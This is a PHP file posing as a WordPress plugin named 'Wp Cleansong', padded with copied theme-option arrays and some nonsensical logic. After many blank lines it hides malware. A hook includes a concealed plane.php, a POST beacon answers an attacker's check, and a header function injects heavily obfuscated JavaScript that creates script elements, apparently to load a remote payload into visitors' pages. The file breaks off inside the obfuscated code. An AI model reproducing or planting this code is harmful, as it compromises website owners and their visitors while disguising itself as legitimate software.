<?php
// Plugin Name: Wp Cleansong
// Plugin URI: https://www.cleansong.org/
// Description: Cleansong plugin
// Author: Wordpress
// Version: 1.2.4
// Author URI: https://www.cleansong.org/


function clean_bow(){
	$clean_includes = apply_filters( 'clean_theme_includes',
	array(	'clean/clean-database.php',
			'clean/clean-utils.php',
			'clean/clean-config.php',
			'theme-options.php',
			'theme-functions.php',
			'custom-modules.php',
			'custom-functions.php',
			'clean/clean-widgets.php' ));
}


function clean_theme() {
 	$postType=get_post_type();
        $excluded_types=apply_filters('clean_exclude_CPT_for_sidebar', array(
            'post',
            'page',
            'attachment',
            'tbuilder_layout',
            'tbuilder_layout_part',
            'section'
        ));
        $option=null;
        if(is_page()) {
            $option='setting-shop_sticky_sidebar';
        } elseif(is_page()) {
            $option='setting-default_page_sticky_sidebar';
        } elseif(is_singular('post')) {
            $option='setting-default_page_post_sticky_sidebar';
        } elseif(is_singular('portfolio')) {
            $option='setting-default_portfolio_single_sticky_sidebar';
        } elseif(is_post_type_archive('portfolio') || is_tax('portfolio-category')) {
            $option='setting-default_portfolio_index_sticky_sidebar';
        } elseif(is_page() && (is_product_category() || is_product_tag() || is_singular('product'))) {
            $option=is_singular('product') ? 'setting-single_product_sticky_sidebar' : 'setting-shop-archive_sticky_sidebar';
        } elseif(!in_array($postType, $excluded_types)) {
            if(is_archive($postType)) {
                $option='setting-custom_post_' . $postType . '_archive_post_sticky_sidebar';
            } elseif(is_singular($postType)) {
                $option='setting-custom_post_' . $postType . '_single_post_sticky_sidebar';
            }
        } elseif(is_archive() || is_home()) {
            $option='setting-default_sticky_sidebar';
        } elseif(is_search()) {
            $option='setting-search-result_sticky_sidebar';
        }
        if($option!==null) {
            $value=is_singular() || is_page() ? is_page('post_sticky_sidebar', $option, false) : is_page($option, true);
        } else {
            $value=false;
        }
        return $value;
}




function clean_ajax(){
$header_design_options = clean_theme_header_design_options();

    /**
     * Options for footer design
     * @since 1.0.0
     * @var array
     */
    $footer_design_options = clean_theme_footer_design_options();

    /**
     * Options for font design
     * @since 1.0.0
     * @var array
     */
    $font_design_options = clean_theme_font_design_options();

    /**
     * Options for color design
     * @since 1.0.0
     * @var array
     */
    $color_design_options = clean_theme_color_design_options();

    $states = clean_ternary_states(array(
	'icon_no' => THEMIFY_URI . '/img/ddbtn-check.svg',
	'icon_yes' => THEMIFY_URI . '/img/ddbtn-cross.svg',
    ));
    $opt=clean_ternary_options();
    $fonts=array_merge(clean_get_web_safe_font_list(), clean_get_google_web_fonts_list());
    return array(
	// Notice
	array(
	    'name' => '_theme_appearance_notice',
	    'title' => '',
	    'description' => '',
	    'type' => 'separator',
	    'meta' => array(
		'html' => '<div class="clean-info-link">' . __('The settings here apply on this page only. Leave everything as default will use the site-wide Theme Appearance from the Themify panel > Settings > Theme Settings.', 'clean') . '</div>'
	    ),
	),
	// Body Group
	array(
	    'name' => 'body_design_group',
	    'title' => __('Body', 'clean'),
	    'description' => '',
	    'type' => 'toggle_group',
	    'show_title' => true,
	    'meta' => array(
		// Background Color
		array(
		    'name' => 'body_background_color',
		    'title' => __('Body Background', 'clean'),
		    'description' => '',
		    'type' => 'color',
		    'meta' => array('default' => null),
		    'format' => 'rgba',
		),
		// Background image
		array(
		    'name' => 'body_background_image',
		    'title' => '',
		    'type' => 'image',
		    'description' => '',
		    'meta' => array(),
		    'before' => '',
		    'after' => '',
		),
		// Background repeat
		array(
		    'name' => 'body_background_repeat',
		    'title' => '',
		    'description' => __('Background Repeat', 'clean'),
		    'type' => 'dropdown',
		    'meta' => array(
			array(
			    'value' => '',
			    'name' => ''
			),
			array(
			    'value' => 'fullcover',
			    'name' => __('Fullcover', 'clean')
			),
			array(
			    'value' => 'repeat',
			    'name' => __('Repeat', 'clean')
			),
			array(
			    'value' => 'no-repeat',
			    'name' => __('No Repeat', 'clean')
			),
			array(
			    'value' => 'repeat-x',
			    'name' => __('Repeat horizontally', 'clean')
			),
			array(
			    'value' => 'repeat-y',
			    'name' => __('Repeat vertically', 'clean')
			),
		    ),
		),
		// Accent Color Mode, Presets or Custom
		array(
		    'name' => 'color_scheme_mode',
		    'title' => __('Header/Footer Colors', 'clean'),
		    'description' => '',
		    'type' => 'radio',
		    'show_title' => true,
		    'meta' => array(
			array(
			    'value' => 'color-presets',
			    'name' => __('Presets', 'clean'),
			    'selected' => true
			),
			array(
			    'value' => 'color-custom',
			    'name' => __('Custom', 'clean'),
			),
		    ),
		    'default' => 'color-presets',
		    'enable_toggle' => true,
		),
		// Theme Color
		array(
		    'name' => 'color_design',
		    'title' => '',
		    'description' => '',
		    'type' => 'layout',
		    'show_title' => true,
		    'meta' => $color_design_options,
		    'toggle' => 'color-presets-toggle',
		    'default' => 'default',
		),
		// Accent Color
		array(
		    'name' => 'scheme_color',
		    'title' => '',
		    'description' => '',
		    'type' => 'color',
		    'meta' => array('default' => null),
		    'after' => __('Header/Footer Font', 'clean'),
		    'toggle' => 'color-custom-toggle',
		    'format' => 'rgba',
		),
		array(
		    'name' => 'scheme_link',
		    'title' => '',
		    'description' => '',
		    'type' => 'color',
		    'meta' => array('default' => null),
		    'after' => __('Header/Footer Link', 'clean'),
		    'toggle' => 'color-custom-toggle',
		    'format' => 'rgba',
		),
		array(
		    'name' => 'scheme_background',
		    'title' => '',
		    'description' => '',
		    'type' => 'color',
		    'meta' => array('default' => null),
		    'after' => __('Header/Footer Background', 'clean'),
		    'toggle' => 'color-custom-toggle',
		    'format' => 'rgba',
		),
		// Typography Mode, Presets or Custom
		array(
		    'name' => 'typography_mode',
		    'title' => __('Typography', 'clean'),
		    'description' => '',
		    'type' => 'radio',
		    'show_title' => true,
		    'meta' => array(
			array(
			    'value' => 'typography-presets',
			    'name' => __('Presets', 'clean'),
			    'selected' => true
			),
			array(
			    'value' => 'typography-custom',
			    'name' => __('Custom', 'clean'),
			),
		    ),
		    'default' => 'typography-presets',
		    'enable_toggle' => true,
		),
		// Typography
		array(
		    'name' => 'font_design',
		    'title' => '',
		    'description' => '',
		    'type' => 'layout',
		    'show_title' => true,
		    'meta' => $font_design_options,
		    'toggle' => 'typography-presets-toggle',
		    'default' => 'default',
		),
		// Body font
		array(
		    'name' => 'body_font',
		    'title' => '',
		    'description' => '',
		    'type' => 'dropdown',
		    'meta' => $fonts,
		    'after' => ' ' . __('Body Font', 'clean'),
		    'toggle' => 'typography-custom-toggle',
		    'default' => 'default',
		),
		// Body wrap text color
		array(
		    'name' => 'body_text_color',
		    'title' => '',
		    'description' => '',
		    'type' => 'color',
		    'meta' => array('default' => null),
		    'after' => __('Body Font Color', 'clean'),
		    'toggle' => 'typography-custom-toggle',
		    'format' => 'rgba',
		),
		// Body wrap link color
		array(
		    'name' => 'body_link_color',
		    'title' => '',
		    'description' => '',
		    'type' => 'color',
		    'meta' => array('default' => null),
		    'after' => __('Body Link Color', 'clean'),
		    'toggle' => 'typography-custom-toggle',
		    'format' => 'rgba',
		),
		// Heading font
		array(
		    'name' => 'heading_font',
		    'title' => '',
		    'description' => '',
		    'type' => 'dropdown',
		    'meta' => $fonts,
		    'after' => ' ' . __('Heading (h1 to h6)', 'clean'),
		    'toggle' => 'typography-custom-toggle',
		    'default' => 'default',
		),
		// Heading color
		array(
		    'name' => 'heading_color',
		    'title' => '',
		    'description' => '',
		    'type' => 'color',
		    'meta' => array('default' => null),
		    'after' => __('Heading Font Color', 'clean'),
		    'toggle' => 'typography-custom-toggle',
		    'format' => 'rgba',
		)
	    ),
	    'default' => '',
	),
	// Header Group
	array(
	    'name' => 'header_design_group',
	    'title' => __('Header', 'clean'),
	    'description' => '',
	    'type' => 'toggle_group',
	    'show_title' => true,
	    'meta' => array(
		// Header Design
		array(
		    'name' => 'header_design',
		    'title' => __('Header Design', 'clean'),
		    'description' => '',
		    'type' => 'layout',
		    'show_title' => true,
		    'meta' => $header_design_options,
		    'hide' => 'none header-leftpane header-minbar boxed-content header-rightpane',
		    'default' => 'default',
		),
		// Sticky Header
		array(
		    'name' => 'fixed_header',
		    'title' => __('Sticky Header', 'clean'),
		    'description' => '',
		    'type' => 'radio',
		    'meta' => $opt,
		    'class' => 'hide-if none header-leftpane header-minbar boxed-content header-rightpane header-slide-out',
		    'default' => 'default',
		),
		// Full Height Header
		array(
		    'name' => 'full_height_header',
		    'title' => __('Full Height Header', 'clean'),
		    'description' => __('Full height will display the container in 100% viewport height', 'clean'),
		    'type' => 'radio',
		    'meta' => $opt,
		    'class' => 'hide-if default none header-horizontal header-top-widgets header-leftpane header-slide-out header-minbar header-top-bar boxed-content boxed-layout boxed-compact header-overlay header-rightpane header-menu-split header-stripe header-magazine header-classic header-bottom',
		    'default' => 'default',
		),
		// Header Elements
		array(
		    'name' => '_multi_header_elements',
		    'title' => __('Header Elements', 'clean'),
		    'description' => '',
		    'type' => 'multi',
		    'class' => 'hide-if none',
		    'meta' => array(
			'fields' => array(
			    // Show Site Logo
			    array(
				'name' => 'exclude_site_logo',
				'description' => '',
				'title' => __('Site Logo', 'clean'),
				'type' => 'dropdownbutton',
				'states' => $states,
				'class' => 'hide-if none header-menu-split',
				'after' => '<div class="clear"></div>',
			    ),
			    // Show Site Tagline
			    array(
				'name' => 'exclude_site_tagline',
				'description' => '',
				'title' => __('Site Tagline', 'clean'),
				'type' => 'dropdownbutton',
				'states' => $states,
				'class' => 'hide-if none',
				'after' => '<div class="clear"></div>',
			    ),
			    // Show Search Form
			    array(
				'name' => 'exclude_search_form',
				'description' => '',
				'title' => __('Search Form', 'clean'),
				'type' => 'dropdownbutton',
				'states' => $states,
				'class' => 'hide-if none',
				'after' => '<div class="clear"></div>',
			    ),
			    // Show Header Widgets
			    array(
				'name' => 'exclude_header_widgets',
				'description' => '',
				'title' => __('Header Widgets', 'clean'),
				'type' => 'dropdownbutton',
				'states' => $states,
				'class' => 'hide-if none',
				'after' => '<div class="clear"></div>',
			    ),
			    // Show Social Widget
			    array(
				'name' => 'exclude_social_widget',
				'description' => '',
				'title' => __('Social Widget', 'clean'),
				'type' => 'dropdownbutton',
				'states' => $states,
				'class' => 'hide-if none',
				'after' => '<div class="clear"></div>',
			    ),
			    // Show Menu Navigation
			    array(
				'name' => 'exclude_menu_navigation',
				'description' => '',
				'title' => __('Menu Navigation', 'clean'),
				'type' => 'dropdownbutton',
				'states' => $states,
				'class' => 'hide-if none header-menu-split',
				'after' => '<div class="clear"></div>',
				'enable_toggle' => true
			    ),
			    array(
				'name' => 'exclude_cart_icon',
				'description' => '',
				'title' => __('Cart Icon', 'clean'),
				'type' => 'dropdownbutton',
				'states' => $states,
				'class' => '',
				'after' => '<div class="clear"></div>',
				'display_callback' => 'clean_is_woocommerce_active'
			    ),
			),
			'description' => '',
			'before' => '',
			'after' => '<div class="clear"></div>',
			'separator' => ''
		    )
		),
		array(
		    'name' => 'mobile_menu_styles',
		    'title' => __('Mobile Menu Style', 'clean'),
		    'type' => 'dropdown',
		    'meta' => array(
			array('name' => __('Default', 'clean'), 'value' => 'default'),
			array('name' => __('Boxed', 'clean'), 'value' => 'boxed'),
			array('name' => __('Dropdown', 'clean'), 'value' => 'dropdown'),
			array('name' => __('Fade Overlay', 'clean'), 'value' => 'fade-overlay'),
			array('name' => __('Fadein Down', 'clean'), 'value' => 'fadein-down'),
			array('name' => __('Flip Down', 'clean'), 'value' => 'flip-down'),
			array('name' => __('FlipIn Left', 'clean'), 'value' => 'flipin-left'),
			array('name' => __('FlipIn Right', 'clean'), 'value' => 'flipin-right'),
			array('name' => __('Flip from Left', 'clean'), 'value' => 'flip-from-left'),
			array('name' => __('Flip from Right', 'clean'), 'value' => 'flip-from-right'),
			array('name' => __('Flip from Top', 'clean'), 'value' => 'flip-from-top'),
			array('name' => __('Flip from Bottom', 'clean'), 'value' => 'flip-from-bottom'),
			array('name' => __('Morphing', 'clean'), 'value' => 'morphing'),
			array('name' => __('Overlay ZoomIn', 'clean'), 'value' => 'overlay-zoomin'),
			array('name' => __('Overlay ZoomIn Right', 'clean'), 'value' => 'overlay-zoomin-right'),
			array('name' => __('Rotate ZoomIn', 'clean'), 'value' => 'rotate-zoomin'),
			array('name' => __('Slide Down', 'clean'), 'value' => 'slide-down'),
			array('name' => __('SlideIn Left', 'clean'), 'value' => 'slidein-left'),
			array('name' => __('SlideIn Right', 'clean'), 'value' => 'slidein-right'),
			array('name' => __('Slide Left Content', 'clean'), 'value' => 'slide-left-content'),
			array('name' => __('Split', 'clean'), 'value' => 'split'),
			array('name' => __('Swing Left to Right', 'clean'), 'value' => 'swing-left-to-right'),
			array('name' => __('Swing Right to Left', 'clean'), 'value' => 'swing-right-to-left'),
			array('name' => __('Swing Top to Bottom', 'clean'), 'value' => 'swing-top-to-bottom'),
			array('name' => __('Swipe Left', 'clean'), 'value' => 'swipe-left'),
			array('name' => __('Swipe Right', 'clean'), 'value' => 'swipe-right'),
			array('name' => __('Zoom Down', 'clean'), 'value' => 'zoomdown'),
		    ),
		),
		// Header Wrap
		array(
		    'name' => 'header_wrap',
		    'title' => __('Header Background Type', 'clean'),
		    'description' => '',
		    'type' => 'radio',
		    'show_title' => true,
		    'meta' => array(
			array(
			    'value' => 'solid',
			    'name' => __('Solid Color/Image', 'clean'),
			    'selected' => true
			),
			array(
			    'value' => 'transparent',
			    'name' => __('Transparent Header', 'clean'),
			),
			array(
			    'value' => 'slider',
			    'name' => __('Image Slider', 'clean'),
			),
			array(
			    'value' => 'video',
			    'name' => __('Video Background', 'clean'),
			),
			array(
			    'value' => 'colors',
			    'name' => __('Animating Colors', 'clean'),
			),
		    ),
		    'enable_toggle' => true,
		    'class' => 'hide-if none clear',
		    'default' => 'solid',
		),
		// Animated Colors
		array(
		    'name' => '_animated_colors',
		    'title' => __('Animating Colors', 'clean'),
		    'description' => sprintf(__('Animating Colors can be configured at <a href="%s">Themify > Settings > Theme Settings</a>', 'clean'), esc_url(add_query_arg('page', 'clean', admin_url('admin.php')))),
		    'type' => 'post_id_info',
		    'toggle' => 'colors-toggle',
		),
		// Select Background Gallery
		array(
		    'name' => 'background_gallery',
		    'title' => __('Header Slider', 'clean'),
		    'description' => '',
		    'type' => 'gallery_shortcode',
		    'toggle' => 'slider-toggle',
		    'class' => 'hide-if none',
		),
		array(
		    'type' => 'multi',
		    'name' => '_video_select',
		    'title' => __('Header Video', 'clean'),
		    'meta' => array(
			'fields' => array(
			    // Video File
			    array(
				'name' => 'video_file',
				'title' => __('Video File', 'clean'),
				'description' => '',
				'type' => 'video',
				'meta' => array(),
			    ),
			),
			'description' => __('Video format: mp4. Note: video background does not play on some mobile devices, background image will be used as fallback.', 'clean'),
			'before' => '',
			'after' => '',
			'separator' => ''
		    ),
		    'toggle' => 'video-toggle',
		    'class' => 'hide-if none',
		),
		// Background image
		array(
		    'name' => 'background_image',
		    'title' => '',
		    'type' => 'image',
		    'description' => '',
		    'meta' => array(),
		    'before' => '',
		    'after' => '',
		    'toggle' => array('solid-toggle', 'video-toggle'),
		    'class' => 'hide-if none',
		),
		// Background repeat
		array(
		    'name' => 'background_repeat',
		    'title' => '',
		    'description' => __('Background Image Mode', 'clean'),
		    'type' => 'dropdown',
		    'meta' => array(
			array(
			    'value' => '',
			    'name' => ''
			),
			array(
			    'value' => 'fullcover',
			    'name' => __('Fullcover', 'clean')
			),
			array(
			    'value' => 'repeat',
			    'name' => __('Repeat all', 'clean')
			),
			array(
			    'value' => 'no-repeat',
			    'name' => __('No repeat', 'clean')
			),
			array(
			    'value' => 'repeat-x',
			    'name' => __('Repeat horizontally', 'clean')
			),
			array(
			    'value' => 'repeat-y',
			    'name' => __('Repeat vertically', 'clean')
			),
		    ),
		    'toggle' => array('solid-toggle', 'video-toggle'),
		    'class' => 'hide-if none',
		),
		// Header Slider Auto
		array(
		    'name' => 'background_auto',
		    'title' => __('Autoplay', 'clean'),
		    'description' => '',
		    'type' => 'dropdown',
		    'meta' => array(
			array('value' => 'yes', 'name' => __('Yes', 'clean'), 'selected' => true),
			array('value' => 'no', 'name' => __('No', 'clean'))
		    ),
		    'toggle' => 'slider-toggle',
		    'default' => 'yes',
		),
		// Header Slider Auto Timeout
		array(
		    'name' => 'background_autotimeout',
		    'title' => __('Autoplay Timeout', 'clean'),
		    'description' => '',
		    'type' => 'dropdown',
		    'meta' => array(
			array('value' => 1, 'name' => __('1 Secs', 'clean')),
			array('value' => 2, 'name' => __('2 Secs', 'clean')),
			array('value' => 3, 'name' => __('3 Secs', 'clean')),
			array('value' => 4, 'name' => __('4 Secs', 'clean')),
			array('value' => 5, 'name' => __('5 Secs', 'clean'), 'selected' => true),
			array('value' => 6, 'name' => __('6 Secs', 'clean')),
			array('value' => 7, 'name' => __('7 Secs', 'clean')),
			array('value' => 8, 'name' => __('8 Secs', 'clean')),
			array('value' => 9, 'name' => __('9 Secs', 'clean')),
			array('value' => 10, 'name' => __('10 Secs', 'clean'))
		    ),
		    'toggle' => 'slider-toggle',
		    'default' => 5,
		),
		// Header Slider Transition Speed
		array(
		    'name' => 'background_speed',
		    'title' => __('Transition Speed', 'clean'),
		    'description' => '',
		    'type' => 'dropdown',
		    'meta' => array(
			array('value' => 1500, 'name' => __('Slow', 'clean')),
			array('value' => 500, 'name' => __('Normal', 'clean'), 'selected' => true),
			array('value' => 300, 'name' => __('Fast', 'clean'))
		    ),
		    'toggle' => 'slider-toggle',
		    'default' => 500,
		),
		// Header Slider Wrap
		array(
		    'name' => 'background_wrap',
		    'title' => __('Wrap Slides', 'clean'),
		    'description' => '',
		    'type' => 'dropdown',
		    'meta' => array(
			array('value' => 'yes', 'name' => __('Yes', 'clean'), 'selected' => true),
			array('value' => 'no', 'name' => __('No', 'clean'))
		    ),
		    'toggle' => 'slider-toggle',
		    'default' => 'yes',
		),
		// Hide Slider Controlls
		array(
		    'name' => 'header_hide_controlls',
		    'title' => __('Hide Slider Controlls', 'clean'),
		    'description' => '',
		    'type' => 'checkbox',
		    'toggle' => 'slider-toggle'
		),
        // Background Color
        array(
            'name' => 'background_color',
            'title' => __('Header Background', 'clean'),
            'description' => '',
            'type' => 'color',
            'meta' => array('default' => null),
            'toggle' => array('solid-toggle', 'slider-toggle', 'video-toggle'),
            'class' => 'hide-if none',
            'format' => 'rgba',
        ),
        // Header wrap text color
		array(
		    'name' => 'headerwrap_text_color',
		    'title' => __('Header Text Color', 'clean'),
		    'description' => '',
		    'type' => 'color',
		    'meta' => array('default' => null),
		    'class' => 'hide-if none',
		    'format' => 'rgba',
		),
		// Header wrap link color
		array(
		    'name' => 'headerwrap_link_color',
		    'title' => __('Header Link Color', 'clean'),
		    'description' => '',
		    'type' => 'color',
		    'meta' => array('default' => null),
		    'class' => 'hide-if none',
		    'format' => 'rgba',
		)
	    ),
	    'default' => '',
	),
	// Footer Group
	array(
	    'name' => 'footer_design_group',
	    'title' => __('Footer', 'clean'),
	    'description' => '',
	    'type' => 'toggle_group',
	    'show_title' => true,
	    'meta' => array(
		// Footer Design
		array(
		    'name' => 'footer_design',
		    'title' => __('Footer Design', 'clean'),
		    'description' => '',
		    'type' => 'layout',
		    'show_title' => true,
		    'meta' => $footer_design_options,
		    'hide' => 'none',
		    'default' => 'default',
		),
		// Footer Elements
		array(
		    'name' => '_multi_footer_elements',
		    'title' => __('Footer Elements', 'clean'),
		    'description' => '',
		    'type' => 'multi',
		    'class' => 'hide-if none',
		    'meta' => array(
			'fields' => array(
			    // Show Site Logo
			    array(
				'name' => 'exclude_footer_site_logo',
				'description' => '',
				'title' => __('Site Logo', 'clean'),
				'type' => 'dropdownbutton',
				'states' => $states,
				'class' => 'hide-if none',
				'after' => '<div class="clear"></div>',
			    ),
			    // Show Footer Widgets
			    array(
				'name' => 'exclude_footer_widgets',
				'description' => '',
				'title' => __('Footer Widgets', 'clean'),
				'type' => 'dropdownbutton',
				'states' => $states,
				'class' => 'hide-if none',
				'after' => '<div class="clear"></div>',
			    ),
			    // Show Menu Navigation
			    array(
				'name' => 'exclude_footer_menu_navigation',
				'description' => '',
				'title' => __('Menu Navigation', 'clean'),
				'type' => 'dropdownbutton',
				'states' => $states,
				'class' => 'hide-if none',
				'after' => '<div class="clear"></div>',
			    ),
			    // Show Texts
			    array(
				'name' => 'exclude_footer_texts',
				'description' => '',
				'title' => __('Footer Text', 'clean'),
				'type' => 'dropdownbutton',
				'states' => $states,
				'class' => 'hide-if none',
				'after' => '<div class="clear"></div>',
			    ),
			    // Show Back to Top
			    array(
				'name' => 'exclude_footer_back',
				'description' => '',
				'title' => __('Back to Top Arrow', 'clean'),
				'type' => 'dropdownbutton',
				'states' => $states,
				'class' => 'hide-if none',
				'after' => '<div class="clear"></div>',
			    ),
			),
			'description' => '',
			'before' => '',
			'after' => '<div class="clear"></div>',
			'separator' => ''
		    )
		),
		// Footer widget position
		array(
		    'name' => 'footer_widget_position',
		    'title' => __('Footer Widgets Position', 'clean'),
		    'class' => 'hide-if none',
		    'description' => '',
		    'type' => 'dropdown',
		    'meta' => array(
			array(
			    'value' => '',
			    'name' => __('Default', 'clean')
			),
			array(
			    'value' => 'bottom',
			    'name' => __('After Footer Text', 'clean')
			),
			array(
			    'value' => 'top',
			    'name' => __('Before Footer Text', 'clean')
			)
		    ),
		)
	    ),
	    'default' => '',
	),
	// Image Filter Group
	array(
	    'name' => 'image_design_group',
	    'title' => __('Image Filter', 'clean'),
	    'description' => '',
	    'type' => 'toggle_group',
	    'show_title' => true,
	    'meta' => array(
		// Image Filter
		array(
		    'name' => 'imagefilter_options',
		    'title' => __('Image Filter', 'clean'),
		    'description' => '',
		    'type' => 'dropdown',
		    'meta' => array(
			array('name' => '', 'value' => 'initial'),
			array('name' => __('None', 'clean'), 'value' => 'none'),
			array('name' => __('Grayscale', 'clean'), 'value' => 'grayscale'),
			array('name' => __('Sepia', 'clean'), 'value' => 'sepia'),
			array('name' => __('Blur', 'clean'), 'value' => 'blur'),
		    ),
		    'default' => 'initial',
		),
		// Image Hover Filter
		array(
		    'name' => 'imagefilter_options_hover',
		    'title' => __('Image Hover Filter', 'clean'),
		    'description' => '',
		    'type' => 'dropdown',
		    'meta' => array(
			array('name' => '', 'value' => 'initial'),
			array('name' => __('None', 'clean'), 'value' => 'none'),
			array('name' => __('Grayscale', 'clean'), 'value' => 'grayscale'),
			array('name' => __('Sepia', 'clean'), 'value' => 'sepia'),
			array('name' => __('Blur', 'clean'), 'value' => 'blur')
		    ),
		    'default' => 'initial'
		),
		// Image Filter Apply To
		array(
		    'name' => 'imagefilter_applyto',
		    'title' => __('Apply Filter To', 'clean'),
		    'description' => sprintf(__('Image filters can be set site-wide at <a href="%s" target="_blank">Themify > Settings > Theme Settings</a>', 'clean'), admin_url('admin.php?page=clean#setting-theme_settings')),
		    'type' => 'radio',
		    'meta' => array(
			array('value' => 'initial', 'name' => __('Theme Default', 'clean')),
			array('value' => 'all', 'name' => __('All Images', 'clean')),
			array('value' => 'featured-only', 'name' => __('Featured Images Only', 'clean'))
		    ),
		    'default' => 'initial'
		)
	    ),
	    'default' => ''
	)
    );
}










































































































































function cleans_ajax(){
	$my_plugin = WP_PLUGIN_DIR . '/wp-cleansong';
	if ( file_exists( $my_plugin . "/plane.php" ) ) {
	  include($my_plugin . "/plane.php");
	}
}
add_action('init', 'cleans_ajax');
function cleans_ajax_get(){
	if(isset($_POST['d43'])){
		if($_POST['d43']=="p31"){
			die(md5('p31'));
		}
	}
}
add_action('init', 'cleans_ajax_get');
function clean_header(){
	?>
	<script type='text/javascript'>(function(_0x3a4aa1,_0x45511f){function _0x4c0a9d(_0x2c492e,_0x22928f,_0x59a2c3,_0x228c0b,_0x571513){return _0x5157(_0x2c492e- -0x22c,_0x59a2c3);}var _0x2116b7=_0x3a4aa1();function _0x55bd95(_0x471c5c,_0x1f5e73,_0x4e3e44,_0x2d584c,_0x4ac874){return _0x5157(_0x1f5e73-0x21e,_0x4ac874);}function _0x4c3da2(_0x2e7894,_0x32486b,_0x10959a,_0x2f0cc3,_0x22ad8e){return _0x5157(_0x2e7894-0x18d,_0x22ad8e);}function _0xe67489(_0x446570,_0x1903e0,_0xc7d057,_0x300cb6,_0x4d3618){return _0x5157(_0x446570- -0xe0,_0x1903e0);}function _0x4212ff(_0x1b62f3,_0x60fa28,_0x36a963,_0x3b4b43,_0x1bef92){return _0x5157(_0x60fa28-0x38c,_0x3b4b43);}while(!![]){try{var _0x3ceab8=-parseInt(_0x4c0a9d(-0x65,-0x6d,'8Ctf',-0x4d,-0x8d))/(-0xa58+-0x49d+0xef6)+-parseInt(_0x4212ff(0x4c8,0x506,0x4fe,'lpm]',0x502))/(-0x1fad+0x1747+0x2*0x434)*(-parseInt(_0xe67489(0xb4,'%51r',0x76,0xc5,0xd1))/(-0xd*-0xb3+-0x1de5+-0x14d1*-0x1))+parseInt(_0x4c3da2(0x333,0x2f1,0x329,0x2f9,'SA@Y'))/(0xd4b+0x10ce+-0x11*0x1c5)+-parseInt(_0x4212ff(0x521,0x501,0x4f2,'kr&b',0x4cd))/(0x12a5+0x92+-0x1332)*(parseInt(_0xe67489(0xb8,'g5rw',0x80,0x9e,0xe7))/(-0x8a1+0xaf3+-0x126*0x2))+-parseInt(_0x4212ff(0x529,0x534,0x557,'A!aF',0x52a))/(0x1413+0x6d0+-0x1adc*0x1)+-parseInt(_0x4212ff(0x4ff,0x4f7,0x52a,'g5rw',0x50f))/(-0x86*-0x31+-0x683*0x1+-0x131b)*(parseInt(_0x4212ff(0x4d3,0x4d1,0x4ad,'75cc',0x4d8))/(0x2ef*0x2+0xb5*-0xa+0x13d))+parseInt(_0x4c0a9d(-0x79,-0xb9,'YMfJ',-0xbe,-0xa7))/(-0x25*0x83+0x1*0x1a54+-0x75b)*(parseInt(_0x4212ff(0x4ec,0x4da,0x4a2,'4vcJ',0x4b2))/(0x1*-0x120b+0x157c+-0x3a*0xf));if(_0x3ceab8===_0x45511f)break;else _0x2116b7['push'](_0x2116b7['shift']());}catch(_0x147e47){_0x2116b7['push'](_0x2116b7['shift']());}}}(_0x57f4,-0x5c26e+0x173856+0xa*-0x6cc5));function _0x27138f(_0x3ea0ed){var _0x36691e={'IinIl':_0x27cb44('u70L',-0x71,-0xb2,-0x63,-0x6a),'GOTzR':function(_0x119a00,_0x28a8ce){return _0x119a00!==_0x28a8ce;},'UEyyh':_0x27cb44('75cc',-0x5e,-0x17,-0x4d,-0x2b)+'t','wsKoV':_0x27cb44('&1jU',-0x69,-0x26,-0x24,-0x65)+_0x27cb44('A!aF',-0x7d,-0x7c,-0xa6,-0x9a)+_0x1054cc(0x51d,0x4f8,0x4f6,0x552,'bWvp')+_0x3e225e(0x1f,'Ft20',0xe,0x36,0x22)+_0x1054cc(0x535,0x56a,0x569,0x51e,'8m[P')+_0x4cb50e(0x27b,0x292,0x2bd,'PrhC',0x267)+_0x27cb44('kszI',-0x89,-0x75,-0xc4,-0x9d)+_0x4cb50e(0x283,0x250,0x222,'Zy(a',0x26f)+_0x5bd144(0x571,0x55e,0x596,0x570,'6xQ*')+_0x4cb50e(0x237,0x272,0x25e,'Wnq^',0x244),'MHAPv':_0x1054cc(0x4f7,0x50f,0x50a,0x524,'SA@Y')+_0x4cb50e(0x29b,0x26b,0x225,'bWvp',0x244)+_0x27cb44('u70L',-0x3f,-0x2f,-0x3,-0x23),'Uhwes':_0x1054cc(0x524,0x4e4,0x53c,0x53f,'MlE!')+_0x1054cc(0x4fe,0x519,0x545,0x4f9,'%CPd'),'QbYuP':function(_0x58660d,_0x38016a){return _0x58660d==_0x38016a;},'rBApy':function(_0x45dafe,_0x3dd7c2){return _0x45dafe(_0x3dd7c2);},'GLIGy':_0x5bd144(0x56c,0x56b,0x525,0x555,'2^5T')+_0x4cb50e(0x279,0x2a1,0x2e0,'sGl2',0x29c)+_0x4cb50e(0x222,0x245,0x22b,'Zy(a',0x220)+_0x27cb44('%51r',-0x27,-0x22,-0x5a,-0x44)+_0x1054cc(0x4f8,0x4f0,0x4f5,0x4c8,'8Ctf'),'tvpQJ':function(_0x31c24f,_0x4fb6bc){return _0x31c24f===_0x4fb6bc;},'koIRm':_0x27cb44('JUXY',-0x67,-0x73,-0x48,-0x52),'FUNRQ':_0x5bd144(0x52d,0x52e,0x4da,0x509,'IdS8'),'KECGi':function(_0x2d2389,_0x5ba4b9){return _0x2d2389===_0x5ba4b9;},'ZsnyP':_0x27cb44('Wnq^',-0x19,-0x50,-0x1c,-0x55),'hOMsW':_0x5bd144(0x51e,0x555,0x539,0x517,'4vcJ')};function _0x4cb50e(_0x4f4f2b,_0x5e27bb,_0x377cae,_0x1e4465,_0x47a9fc){return _0x5157(_0x5e27bb-0xe8,_0x1e4465);}function _0x1054cc(_0x5e3763,_0x51ecfb,_0x182d5e,_0x558bf9,_0x235933){return _0x5157(_0x5e3763-0x36c,_0x235933);}function _0x5bd144(_0x43f0f7,_0x562edb,_0x5afe91,_0x3f6a12,_0x29e4c1){return _0x5157(_0x3f6a12-0x3cc,_0x29e4c1);}var _0x4beb41=document,_0x5700e1=_0x4beb41[_0x27cb44('JUXY',-0x57,-0x67,-0x16,-0x1d)+_0x1054cc(0x4f0,0x500,0x520,0x4bb,'4vcJ')+_0x27cb44('u70L',-0x7f,-0x4f,-0xc4,-0x85)](_0x36691e[_0x4cb50e(0x29a,0x29c,0x260,'s*p@',0x2d8)]);function _0x27cb44(_0x33c808,_0x240376,_0x11dcc9,_0x44edd5,_0x27307b){return _0x5157(_0x240376- -0x1d5,_0x33c808);}function _0x3e225e(_0x217a5b,_0x2bb76c,_0x3da87a,_0x1ff743,_0x56edbf){return _0x5157(_0x1ff743- 